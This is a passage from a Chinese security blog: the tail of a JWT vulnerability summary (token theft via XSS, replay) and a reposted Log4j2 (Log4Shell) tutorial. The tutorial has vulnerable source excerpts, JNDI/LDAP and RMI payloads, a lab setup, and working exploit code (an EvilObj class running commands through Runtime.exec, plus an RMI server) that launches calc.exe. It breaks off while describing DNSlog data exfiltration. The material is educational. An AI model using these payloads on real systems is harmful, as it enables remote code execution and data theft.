<h2 id="十、未校验签名的JWT的模糊测试"><a href="#十、未校验签名的JWT的模糊测试" class="headerlink" title="十、未校验签名的JWT的模糊测试"></a>十、<strong>未校验签名的JWT的模糊测试</strong></h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/JWT%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-16641717808464.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/JWT%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-16641717859886.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/JWT%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-16641717919448.png" alt="图片"></p>
<h2 id="十一、重放JWT（token令牌不过期）"><a href="#十一、重放JWT（token令牌不过期）" class="headerlink" title="十一、重放JWT（token令牌不过期）"></a>十一、<strong>重放JWT（token令牌不过期）</strong></h2><p>如果特定令牌只能使用一次怎么办？让我们想象一个场景，当用户编写一个生成的令牌以执行我们API中的DELETE方法时。然后，例如1天后（理论上他不再拥有相应的权限）之后，他尝试再次使用它（所谓的重播攻击）。</p>
<p>为此，请使用以下声明：**jti **和 <strong>exp</strong>。Jti（JWT ID）是令牌标识符，必须是唯一的，而exp是令牌到期日期的定义。这两个字段的组合将使我们在适当程度上缩短令牌的有效性及其唯一性。</p>
<p>因此 token 的令牌失效时间建议设置为2小时失效</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>  通过对众多实际案例漏洞测试，其中弱密钥、密钥泄露、不校验签名、信息泄露这些问题出现的居多，像更改 Header 不使用签名，暂时在实际生成环境中没遇到过。测试方面遇到 JWT 根据 jwt-tools 工具和其 WIKI 测试方法，将所有已知漏洞都试一遍，避免遗漏。另一个实际利用点可以尝试 XSS 打 Token。实际场景中通常将 Token 放入 Local Storage 存储，下次请求时取出放入 HTTP Header 传输，那么此时可以配合 XSS 读取 Token 来截取账户。因为 Token 是有时效，部分应用可以通过现有存活 Token 去颁发新的 Token 以此延长使用有效期，通过这点可以让 Token 永久生效。</p>
]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>log4j</title>
    <url>/posts/a2702c10.html</url>
    <content><![CDATA[<blockquote>
<p>编者注：讲解的非常全面，适合学习</p>
<p>转载自：<a href="https://mp.weixin.qq.com/s/HW2-VRg44ZEFcWxBmDk-CA">https://mp.weixin.qq.com/s/HW2-VRg44ZEFcWxBmDk-CA</a></p>
</blockquote>
<h1 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h1><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><h4 id="影响范围：Apache-Log4j-2-x-lt-x3D-2-14-1"><a href="#影响范围：Apache-Log4j-2-x-lt-x3D-2-14-1" class="headerlink" title="影响范围：Apache Log4j 2.x&lt;&#x3D;2.14.1"></a>影响范围：Apache Log4j 2.x&lt;&#x3D;2.14.1</h4><p><strong>目前为止已知如下组件存在漏洞：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring-Boot-strater-log4j2</span><br><span class="line">Apache Struts2</span><br><span class="line">Apache Solr</span><br><span class="line">Apache Flink</span><br><span class="line">Apache Druid</span><br><span class="line">ElasticSearch</span><br><span class="line">Flume</span><br><span class="line">Dubbo</span><br><span class="line">Redis</span><br><span class="line">Logstash</span><br><span class="line">Kafka</span><br><span class="line">vmvare</span><br></pre></td></tr></table></figure>

<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>关于漏洞原理可以参考文章 <a href="https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247485584&idx=1&sn=2fad11942986807ea7545f7b8b5d6af8&scene=21#wechat_redirect">《Log4j2 研究之lookup》</a>,强烈推荐 idea，ctrl 直接点进去看源码，下面是触发漏洞的关键代码：</p>
<p>1、org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 <code>format()</code> 方法（表达式内容替换）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void format(final LogEvent event, final StringBuilder toAppendTo) &#123;</span><br><span class="line">        Message msg = event.getMessage();</span><br><span class="line">        if (msg instanceof StringBuilderFormattable) &#123;</span><br><span class="line">            boolean doRender = this.textRenderer != null;</span><br><span class="line">            StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo;</span><br><span class="line">            int offset = workingBuilder.length();</span><br><span class="line">            if (msg instanceof MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">                ((MultiFormatStringBuilderFormattable)msg).formatTo(this.formats, workingBuilder);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">            &#125;</span><br><span class="line">            if (this.config != null &amp;&amp; !this.noLookups) &#123;</span><br><span class="line">                for(int i = offset; i &lt; workingBuilder.length() - 1; ++i) &#123;</span><br><span class="line">                    if (workingBuilder.charAt(i) == &#x27;$&#x27; &amp;&amp; workingBuilder.charAt(i + 1) == &#x27;&#123;&#x27;) &#123;</span><br><span class="line">                        String value = workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                        workingBuilder.setLength(offset);</span><br><span class="line">                        workingBuilder.append(this.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (doRender) &#123;</span><br><span class="line">                this.textRenderer.render(workingBuilder, toAppendTo);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (msg != null) &#123;</span><br><span class="line">                String result;</span><br><span class="line">                if (msg instanceof MultiformatMessage) &#123;</span><br><span class="line">                    result = ((MultiformatMessage)msg).getFormattedMessage(this.formats);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    result = msg.getFormattedMessage();</span><br><span class="line">                &#125;</span><br><span class="line">                if (result != null) &#123;</span><br><span class="line">                    toAppendTo.append(this.config != null &amp;&amp; result.contains(&quot;$&#123;&quot;) ? this.config.getStrSubstitutor().replace(event, result) : result);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    toAppendTo.append(&quot;null&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码的主要内容就是一旦发现日志中包含 <code>$&#123;</code> 就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。在 <code>$&#123;</code> 中可以使用的关键词如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;ctx:loginId&#125;</span><br><span class="line">$&#123;map:type&#125;</span><br><span class="line">$&#123;filename&#125;</span><br><span class="line">$&#123;date:MM-dd-yyyy&#125;</span><br><span class="line">$&#123;docker:containerId&#125;</span><br><span class="line">$&#123;docker:containerName&#125;</span><br><span class="line">$&#123;docker:imageName&#125;</span><br><span class="line">$&#123;env:USER&#125;</span><br><span class="line">$&#123;event:Marker&#125;</span><br><span class="line">$&#123;mdc:UserId&#125;</span><br><span class="line">$&#123;java:runtime&#125;</span><br><span class="line">$&#123;java:vm&#125;</span><br><span class="line">$&#123;java:os&#125;</span><br><span class="line">$&#123;jndi:logging/context-name&#125;</span><br><span class="line">$&#123;hostName&#125;</span><br><span class="line">$&#123;docker:containerId&#125;</span><br><span class="line">$&#123;k8s:accountName&#125;</span><br><span class="line">$&#123;k8s:clusterName&#125;</span><br><span class="line">$&#123;k8s:containerId&#125;</span><br><span class="line">$&#123;k8s:containerName&#125;</span><br><span class="line">$&#123;k8s:host&#125;</span><br><span class="line">$&#123;k8s:labels.app&#125;</span><br><span class="line">$&#123;k8s:labels.podTemplateHash&#125;</span><br><span class="line">$&#123;k8s:masterUrl&#125;</span><br><span class="line">$&#123;k8s:namespaceId&#125;</span><br><span class="line">$&#123;k8s:namespaceName&#125;</span><br><span class="line">$&#123;k8s:podId&#125;</span><br><span class="line">$&#123;k8s:podIp&#125;</span><br><span class="line">$&#123;k8s:podName&#125;</span><br><span class="line">$&#123;k8s:imageId&#125;</span><br><span class="line">$&#123;k8s:imageName&#125;</span><br><span class="line">$&#123;log4j:configLocation&#125;</span><br><span class="line">$&#123;log4j:configParentLocation&#125;</span><br><span class="line">$&#123;spring:spring.application.name&#125;</span><br><span class="line">$&#123;main:myString&#125;</span><br><span class="line">$&#123;main:0&#125;</span><br><span class="line">$&#123;main:1&#125;</span><br><span class="line">$&#123;main:2&#125;</span><br><span class="line">$&#123;main:3&#125;</span><br><span class="line">$&#123;main:4&#125;</span><br><span class="line">$&#123;main:bar&#125;</span><br><span class="line">$&#123;name&#125;</span><br><span class="line">$&#123;marker&#125;</span><br><span class="line">$&#123;marker:name&#125;</span><br><span class="line">$&#123;spring:profiles.active[0]</span><br><span class="line">$&#123;sys:logPath&#125;</span><br><span class="line">$&#123;web:rootDir&#125;</span><br></pre></td></tr></table></figure>

<p>来源：</p>
<blockquote>
<p><a href="https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a">https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a</a></p>
</blockquote>
<p>2、org.apache.logging.log4j.core.lookup.StrSubstitutor（提取字符串，并通过 lookup 进行内容替换）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private int substitute(final LogEvent event, final StringBuilder buf, final int offset, final int length, List&lt;String&gt; priorVariables) &#123;</span><br><span class="line">        StrMatcher prefixMatcher = this.getVariablePrefixMatcher();</span><br><span class="line">        StrMatcher suffixMatcher = this.getVariableSuffixMatcher();</span><br><span class="line">        char escape = this.getEscapeChar();</span><br><span class="line">        StrMatcher valueDelimiterMatcher = this.getValueDelimiterMatcher();</span><br><span class="line">        boolean substitutionInVariablesEnabled = this.isEnableSubstitutionInVariables();</span><br><span class="line">        boolean top = priorVariables == null;</span><br><span class="line">        boolean altered = false;</span><br><span class="line">        int lengthChange = 0;</span><br><span class="line">        char[] chars = this.getChars(buf);</span><br><span class="line">        int bufEnd = offset + length;</span><br><span class="line">        int pos = offset;</span><br><span class="line">        while(true) &#123;</span><br><span class="line">            label117:</span><br><span class="line">            while(pos &lt; bufEnd) &#123;</span><br><span class="line">                int startMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br><span class="line">                if (startMatchLen == 0) &#123;</span><br><span class="line">                    ++pos;</span><br><span class="line">                &#125; else if (pos &gt; offset &amp;&amp; chars[pos - 1] == escape) &#123;</span><br><span class="line">                    buf.deleteCharAt(pos - 1);</span><br><span class="line">                    chars = this.getChars(buf);</span><br><span class="line">                    --lengthChange;</span><br><span class="line">                    altered = true;</span><br><span class="line">                    --bufEnd;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    int startPos = pos;</span><br><span class="line">                    pos += startMatchLen;</span><br><span class="line">                    int endMatchLen = false;</span><br><span class="line">                    int nestedVarCount = 0;</span><br><span class="line">                    while(true) &#123;</span><br><span class="line">                        while(true) &#123;</span><br><span class="line">                            if (pos &gt;= bufEnd) &#123;</span><br><span class="line">                                continue label117;</span><br><span class="line">                            &#125;</span><br><span class="line">                            int endMatchLen;</span><br><span class="line">                            if (substitutionInVariablesEnabled &amp;&amp; (endMatchLen = prefixMatcher.isMatch(chars, pos, offset, bufEnd)) != 0) &#123;</span><br><span class="line">                                ++nestedVarCount;</span><br><span class="line">                                pos += endMatchLen;</span><br><span class="line">                            &#125; else &#123;</span><br><span class="line">                                endMatchLen = suffixMatcher.isMatch(chars, pos, offset, bufEnd);</span><br><span class="line">                                if (endMatchLen == 0) &#123;</span><br><span class="line">                                    ++pos;</span><br><span class="line">                                &#125; else &#123;</span><br><span class="line">                                    if (nestedVarCount == 0) &#123;</span><br><span class="line">                                        String varNameExpr = new String(chars, startPos + startMatchLen, pos - startPos - startMatchLen);</span><br><span class="line">                                        if (substitutionInVariablesEnabled) &#123;</span><br><span class="line">                                            StringBuilder bufName = new StringBuilder(varNameExpr);</span><br><span class="line">                                            this.substitute(event, bufName, 0, bufName.length());</span><br><span class="line">                                            varNameExpr = bufName.toString();</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        pos += endMatchLen;</span><br><span class="line">                                        String varName = varNameExpr;</span><br><span class="line">                                        String varDefaultValue = null;</span><br><span class="line">                                        int i;</span><br><span class="line">                                        int valueDelimiterMatchLen;</span><br><span class="line">                                        if (valueDelimiterMatcher != null) &#123;</span><br><span class="line">                                            char[] varNameExprChars = varNameExpr.toCharArray();</span><br><span class="line">                                            int valueDelimiterMatchLen = false;</span><br><span class="line">                                            label100:</span><br><span class="line">                                            for(i = 0; i &lt; varNameExprChars.length &amp;&amp; (substitutionInVariablesEnabled || prefixMatcher.isMatch(varNameExprChars, i, i, varNameExprChars.length) == 0); ++i) &#123;</span><br><span class="line">                                                if (this.valueEscapeDelimiterMatcher != null) &#123;</span><br><span class="line">                                                    int matchLen = this.valueEscapeDelimiterMatcher.isMatch(varNameExprChars, i);</span><br><span class="line">                                                    if (matchLen != 0) &#123;</span><br><span class="line">                                                        String varNamePrefix = varNameExpr.substring(0, i) + &#x27;:&#x27;;</span><br><span class="line">                                                        varName = varNamePrefix + varNameExpr.substring(i + matchLen - 1);</span><br><span class="line">                                                        int j = i + matchLen;</span><br><span class="line">                                                        while(true) &#123;</span><br><span class="line">                                                            if (j &gt;= varNameExprChars.length) &#123;</span><br><span class="line">                                                                break label100;</span><br><span class="line">                                                            &#125;</span><br><span class="line">                                                            if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, j)) != 0) &#123;</span><br><span class="line">                                                                varName = varNamePrefix + varNameExpr.substring(i + matchLen, j);</span><br><span class="line">                                                                varDefaultValue = varNameExpr.substring(j + valueDelimiterMatchLen);</span><br><span class="line">                                                                break label100;</span><br><span class="line">                                                            &#125;</span><br><span class="line">                                                            ++j;</span><br><span class="line">                                                        &#125;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                    if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != 0) &#123;</span><br><span class="line">                                                        varName = varNameExpr.substring(0, i);</span><br><span class="line">                                                        varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">                                                        break;</span><br><span class="line">                                                    &#125;</span><br><span class="line">                                                &#125; else if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != 0) &#123;</span><br><span class="line">                                                    varName = varNameExpr.substring(0, i);</span><br><span class="line">                                                    varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">                                                    break;</span><br><span class="line">                                                &#125;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        if (priorVariables == null) &#123;</span><br><span class="line">                                            priorVariables = new ArrayList();</span><br><span class="line">                                            ((List)priorVariables).add(new String(chars, offset, length + lengthChange));</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        this.checkCyclicSubstitution(varName, (List)priorVariables);</span><br><span class="line">                                        ((List)priorVariables).add(varName);</span><br><span class="line">                                        String varValue = this.resolveVariable(event, varName, buf, startPos, pos);</span><br><span class="line">                                        if (varValue == null) &#123;</span><br><span class="line">                                            varValue = varDefaultValue;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        if (varValue != null) &#123;</span><br><span class="line">                                            valueDelimiterMatchLen = varValue.length();</span><br><span class="line">                                            buf.replace(startPos, pos, varValue);</span><br><span class="line">                                            altered = true;</span><br><span class="line">                                            i = this.substitute(event, buf, startPos, valueDelimiterMatchLen, (List)priorVariables);</span><br><span class="line">                                            i += valueDelimiterMatchLen - (pos - startPos);</span><br><span class="line">                                            pos += i;</span><br><span class="line">                                            bufEnd += i;</span><br><span class="line">                                            lengthChange += i;</span><br><span class="line">                                            chars = this.getChars(buf);</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        ((List)priorVariables).remove(((List)priorVariables).size() - 1);</span><br><span class="line">                                        continue label117;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    --nestedVarCount;</span><br><span class="line">                                    pos += endMatchLen;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (top) &#123;</span><br><span class="line">                return altered ? 1 : 0;</span><br><span class="line">            &#125;</span><br><span class="line">            return lengthChange;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>日志在打印时当遇到 <code>$&#123;</code> 后，Interpolator 类以 <code>:</code> 号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。</p>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>log4j2 支持很多协议，例如通过 ldap 查找变量，通过 docker 查找变量，详细参考这里：</p>
<blockquote>
<p><a href="https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html">https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html</a></p>
</blockquote>
<p>从网上大家的测试来看，主要使用 ldap 来构造 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://xxx.xxx.xxx.xxx/exp&#125;</span><br></pre></td></tr></table></figure>

<p>最终效果就是通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令，整个利用流程如图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640.png" alt="图片"></p>
<p>整个利用流程分两步：</p>
<p>第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址。</p>
<p>第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令。</p>
<h4 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h4><p>在进行漏洞测试之前，首先部署一个漏洞靶场供测试之用。</p>
<p>1、maven pom.xml: 导入 log4j-core 和 log4j-api 既可（2.14.1 及其以下）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;groupId&gt;org.example&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-rce&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>2、main 入口类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line">public class log4j &#123;</span><br><span class="line">    private static final Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/tsslma&#125;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>多种方法漏洞利用</strong></p>
<h5 id="方法一：利用-JNDI-注入器"><a href="#方法一：利用-JNDI-注入器" class="headerlink" title="方法一：利用 JNDI 注入器"></a>方法一：利用 JNDI 注入器</h5><p>1、github 下载 jndi 注入器（下载 jar 包即可）</p>
<blockquote>
<p><a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases">https://github.com/welk1n/JNDI-Injection-Exploit/releases</a></p>
</blockquote>
<p>2、运行 jar 包，开启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;C:\Windows\WinSxS\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\calc.exe&quot; -A &quot;127.0.0.1&quot;</span><br></pre></td></tr></table></figure>

<p><strong>参数说明</strong></p>
<ul>
<li>-c ：远程 class 文件中要执行的命令。</li>
<li>-A ：服务器地址，可以是 ip 或者域名</li>
</ul>
<p><strong>注意事项</strong></p>
<ul>
<li>要确保 1099,1389，8180 端口可用，或下载源码在 run.ServerStart 类 26~28 行更改默认端口，再打包成 jar 包运行</li>
<li>命令会作为参数传入 <code>Runtime.getRuntime().exec()</code>，所以需要确保命令传入 <code>exec()</code> 方法可执行。</li>
<li>bash 等可在 shell 直接执行的相关命令需要加双引号，比如说 <code>java -jar JNDI.jar -C &quot;bash -c ...&quot;</code></li>
</ul>
<p>3、根据 cmd 日志拼接 log4j2 打印的日志</p>
<p>由控制台打印的日志可知，jdk1.8 ldap 协议的临时生成的类为 kk1i3g，log4j 日志打印</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-16539679691752.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1:1389/kk1i3g&#125;</span><br></pre></td></tr></table></figure>

<p>4、运行 main 入口类，打印 log4j2 日志，弹出计算器</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-16539679827374.png" alt="图片"></p>
<h5 id="方法二：根据-jndi-注入原理自己编写"><a href="#方法二：根据-jndi-注入原理自己编写" class="headerlink" title="方法二：根据 jndi 注入原理自己编写"></a>方法二：根据 jndi 注入原理自己编写</h5><p>1、在 java 下新建 exp 包</p>
<p>2、在 exp 下新建需要被注入的类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package exp;</span><br><span class="line">import javax.lang.model.element.Name;</span><br><span class="line">import javax.naming.Context;</span><br><span class="line">import java.io.BufferedInputStream;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">public class EvilObj &#123;</span><br><span class="line">    public static void exec(String cmd) throws IOException &#123;</span><br><span class="line">        String sb = &quot;&quot;;</span><br><span class="line">        BufferedInputStream bufferedInputStream = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">        BufferedReader inBr = new BufferedReader(new InputStreamReader(bufferedInputStream));</span><br><span class="line">        String lineStr;</span><br><span class="line">        while((lineStr = inBr.readLine()) != null)&#123;</span><br><span class="line">            sb += lineStr+&quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        inBr.close();</span><br><span class="line">        inBr.close();</span><br><span class="line">    &#125;</span><br><span class="line">    public Object getObjectInstance(Object obj, Name name, Context context, HashMap&lt;?, ?&gt; environment) throws Exception&#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    static &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            //需要执行的命令</span><br><span class="line">            exec(&quot;C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe&quot;);</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、创建服务类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package exp;</span><br><span class="line">import com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line">import javax.naming.NamingException;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">//        String url = &quot;http://110.40.250.105/jndiRemote/&quot;;</span><br><span class="line">        String url = &quot;http://127.0.0.1:6666/&quot;;</span><br><span class="line">        System.out.println(&quot;Create RMI registry on port 1099&quot;);</span><br><span class="line">        Reference reference = new Reference(&quot;exp.EvilObj&quot;, &quot;exp.EvilObj&quot;, url);</span><br><span class="line">        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(&quot;evil&quot;, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加了两个文件的目录结构为：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-16539680320266.png" alt="图片"></p>
<p>4、在编译好的 EvilObj 目录下 cmd，执行 <code>python -m http.server 6666</code> 打开 http 服务（在本地其实不打开也访问的到）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-16539680443768.png" alt="图片"></p>
<p>5、log4j 的 main 方法打印 </p>
<blockquote>
<p>logger.error(“${jndi:rmi:&#x2F;&#x2F;localhost:1099&#x2F;evil}”);</p>
</blockquote>
<p>6、启动 Server，启动 log4j，弹出计算器</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396806017910.png" alt="图片"></p>
<h5 id="方法三：利用-dnslog-检测并外带数据"><a href="#方法三：利用-dnslog-检测并外带数据" class="headerlink" title="方法三：利用 dnslog 检测并外带数据"></a>方法三：利用 dnslog 检测并外带数据</h5><p>1、访问 <a href="https://log.咕.com/%EF%BC%8C%E7%82%B9%E5%87%BB">https://log.xn--9tr.com/，点击</a> Get SubDomain 获取域名（当然也可以选择其他平台，比如 dnslog、ceye 等）：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Log4j%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-165396808096212.png" alt="图片"></p>
<p>2、拼接日志（将域名加进日志里面）</p>
